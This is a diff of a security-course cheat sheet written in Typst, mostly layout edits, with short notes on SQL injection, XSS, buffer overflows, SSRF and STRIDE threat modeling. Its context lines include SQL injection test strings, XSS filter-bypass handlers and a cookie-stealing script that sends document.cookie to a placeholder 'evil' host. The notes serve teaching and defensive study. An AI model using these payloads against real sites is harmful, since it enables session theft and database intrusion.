@@ -135,14 +135,12 @@
 = Web Application Security Testing (SDL 5 & 6)
 #concept-block(body: [
   #inline("Injection Attacks")
-  *Core idea*: User input treated as code, not data
-
   #subinline("SQL Injection")
   *Detection:*
   - *Testing*: Insert `'` → SQL error (HTTP 500, different response) = vulnerable
   - *Blind SQLi* (no visible errors):
     - *Time-based*: ```sql SLEEP(5)``` causes delay if vulnerable
-    - *Boolean-based*: Different response for true/false (```sql ' AND 1=1--``` vs ```sql ' AND 1=2--```)
+    - *Boolean-based*: ```sql ' AND 1=1--``` vs ```sql ' AND 1=2--``` → different response
 
   *Exploitation:*
   - *Tautology*: ```sql ' OR ''='``` makes WHERE always TRUE → bypass login
@@ -250,6 +248,8 @@
   - *Cookie steal*: `<script>fetch('https://evil?c='+document.cookie)</script>`
   - *POST request*: Hidden form + `document.forms[0].submit()` or `fetch()` with body
 
+  #colbreak()
+
   #subinline("Filter Bypass Techniques")
   Filters blocking `<script>` often miss:
   - *Event handlers*: `<img src=x onerror="...">`, `<input onfocus="..." autofocus>`
@@ -345,7 +345,7 @@
 #concept-block(body: [
   #inline("Buffer Overflow")
   - Write/read data *beyond end of allocated buffer* in memory
-  - Consequences: modify program flow, crash, inject code, access sensitive data
+  - Consequences: crash, code injection, data leak, control hijack
   - Kingdom: *Input Validation and Representation*
   - Only in *C/C++* (no runtime bounds checking). Java/.NET safe (JVM checks, throws `ArrayIndexOutOfBoundsException`)
   - But: JVM itself written in C → may have buffer overflow vulnerabilities
@@ -353,7 +353,7 @@
 
   #subinline("Memory Layout")
   #grid(
-    columns: (2fr, 10fr),
+    columns: (1.65fr, 10fr),
     gutter: 8pt,
     align: horizon,
     image("assets/memory-layout.png"),
@@ -373,8 +373,10 @@
   - *old rbp*: Saved so caller's frame can be restored after return
   - *return address*: Where to jump back after function completes
 
-  #image("assets/stack-frame-main.png")
-  #image("assets/stack-frame-area.png")
+  #align(center)[
+    #image("assets/stack-frame-main.png", width: 75%)
+    #image("assets/stack-frame-area.png", width: 75%)
+  ]
 
   #subinline("How Exploitation Works")
   #grid(
@@ -441,9 +443,9 @@
   #subinline("Variable Reordering (gcc)")
   With `-fstack-protector-all`, gcc reorders stack variables: buffers placed at *higher* addresses than pointers/scalars. Overflow writes toward higher addresses → can't reach pointers below buffer.
 
-  Without: `[buffer] [pointer] [old rbp] [ret addr]` → overflow overwrites pointer ✗
+  Without: `[buffer] [pointer] [old rbp] [ret addr]` → overwrites pointer ✗
 
-  With: `[pointer] [buffer] [canary] [old rbp] [ret addr]` → pointer safe, canary detects overflow ✓
+  With: `[pointer] [buffer] [canary] [old rbp] [ret addr]` → pointer safe ✓
 
   #subinline("Heap Read Overflow (Heartbleed)")
   Different from stack overflow: *read* beyond buffer, not write.
@@ -486,6 +488,8 @@
   Not attacker-controlled, but may accidentally leak sensitive data.
 
   *Why protections don't help*: Reading memory, not writing. Canaries/ASLR/NX irrelevant. Fix: Always use fixed format string.
+
+  // #colbreak()
 
   #subinline("Limitations of Protections")
   - Protection features not always enabled/available (embedded, mobile, sensors)
@@ -558,6 +562,8 @@
   - Split functionality across apps (admin dashboard internal-only vs customer app public)
   - DB user with full rights + SQLi → attacker accesses all tables
 
+  #colbreak()
+
   #inline("5. Separation of Privileges")
   No single user can carry out AND conceal an action (four-eyes principle). \
   Separate: approval ↔ execution ↔ monitoring.
@@ -625,6 +631,8 @@
   - *ECB*: NEVER use - identical blocks → identical ciphertext
   - *CBC*: Needs separate MAC for integrity
   - *GCM*: Authenticated encryption (integrity built-in) - *recommended*
+
+  #colbreak()
 
   #subinline("Encrypt / Decrypt Flow")
   ```java
@@ -1083,6 +1091,8 @@
     - `127.0.0.1.nip.io` = DNS rebinding, resolves to 127.0.0.1
   - *Fix*: Whitelist allowed domains, block ALL private IP ranges (10.x, 172.16-31.x, 192.168.x, 127.x, 169.254.x)
 
+  #colbreak()
+
   #subinline("CRLF Injection / HTTP Response Splitting")
   HTTP headers separated by CRLF (`\r\n`). User input in response headers → attacker injects `%0d%0a` to add arbitrary headers.
 
@@ -1143,6 +1153,8 @@
   // GOOD: returns only allowed fields
   return new UserDTO(user.getName(), user.getEmail());
   ```
+
+  #colbreak()
 
   #subinline("Cookie-Based Access Control Flaws")
   Server uses separate cookies for authentication (`auth_token`) and user identification (`user_id`), but only validates the auth token → trusts `user_id` cookie blindly.
@@ -1339,6 +1351,24 @@
   - If risk too high → vulnerability identified
   - Define new security requirements to reduce risk to acceptable level
 
+  #inline("Threat Agents")
+  - *Script Kiddies*: Fun/fame, low skill. Free tools, low-hanging fruit
+  - *Insiders*: Revenge/profit, low-med skill. Abuse legitimate access, know protections
+  - *Hacktivists*: Politically motivated, target orgs they oppose. DDoS, defacement, data leaks
+  - *Cyber Criminals*: Profit, med-high skill. Phishing, ransomware, botnets
+  - *Nation States*: Intelligence, unlimited resources. Specific targets, will do anything
+  Key: Criminals pick easy targets, nation states persist until success
+
+  #inline("Key Non-Obvious Points")
+  - STRIDE often leads to *defense in depth* (multiple requirements protect same asset)
+  - Same attack goal can be achieved via *multiple DFD paths* → analyze all (attacker needs just ONE)
+  - Focus on DFD elements *near trust boundaries* (where attacks happen)
+  - Don't assume security exists (if not documented, assume it's not there)
+  - Don't forget insiders (malicious + accidental)
+  - Security requirements → Security design/controls (tech-specific implementation)
+
+  #colbreak()
+
   #inline("STRIDE Examples")
 
   #subinline("University Library")
@@ -1387,23 +1417,9 @@
   *Process: Voting Computer*
   - *T8 (T)*: Compromise counting logic → Code signing + integrity checks
   - *T9 (E)*: Gain admin access → Strong auth + separation of duties
-
-  #inline("Threat Agents")
-  - *Script Kiddies*: Fun/fame, low skill. Free tools, low-hanging fruit
-  - *Insiders*: Revenge/profit, low-med skill. Abuse legitimate access, know protections
-  - *Hacktivists*: Politically motivated, target orgs they oppose. DDoS, defacement, data leaks
-  - *Cyber Criminals*: Profit, med-high skill. Phishing, ransomware, botnets
-  - *Nation States*: Intelligence, unlimited resources. Specific targets, will do anything
-  Key: Criminals pick easy targets, nation states persist until success
-
-  #inline("Key Non-Obvious Points")
-  - STRIDE often leads to *defense in depth* (multiple requirements protect same asset)
-  - Same attack goal can be achieved via *multiple DFD paths* → analyze all (attacker needs just ONE)
-  - Focus on DFD elements *near trust boundaries* (where attacks happen)
-  - Don't assume security exists (if not documented, assume it's not there)
-  - Don't forget insiders (malicious + accidental)
-  - Security requirements → Security design/controls (tech-specific implementation)
 ])
+
+#colbreak()
 
 = Security Risk Analysis (Horizontal Activity)
 
